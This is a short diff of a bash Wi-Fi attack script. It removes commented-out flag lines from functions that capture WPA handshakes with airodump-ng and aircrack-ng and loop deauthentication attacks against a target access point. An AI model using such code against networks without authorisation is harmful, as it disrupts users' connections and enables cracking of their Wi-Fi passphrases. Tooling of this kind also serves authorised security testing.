@@ -146,7 +146,6 @@ handshake_check(){
     echo"" | aircrack-ng -a 2 -w - -b ${ap_bssid} ${temp_dir}/handshake-01.cap \
     2>/dev/null | grep -q 'Passphrase not in dictionary'
     if [ $? -eq 0 ];then
-        # handshake_sig=0
         kill -15 ${airodump_pid[0]}
         stop_monitor_mode ${iface}
         apbssid=$(echo ${ap_bssid} | tr ":" "-")
@@ -183,7 +182,6 @@ initialization(){
     iwconfig 2>/dev/null | grep -E '^[^ ]+ ' | awk '{print $1}' | while read line;do
         stop_monitor_mode ${line}
     done
-    # handshake_sig=1
     temp_dir=${CURRENT_DIR}/temp
     [ -d ${temp_dir} ] || mkdir -p ${temp_dir}
     [ -d ${temp_dir} ] && chmod 777 ${temp_dir} && rm -rf ${temp_dir}/*
@@ -227,7 +225,6 @@ wpa_attack(){
     airodump_pid=($(ps -ef | grep '^root.*airodump-ng' | awk '{print $2}'))
     while true;do
         handshake_check && break
-        # [ ${handshake_sig} -eq 0 ] && break
         send_deauth
     done
 }
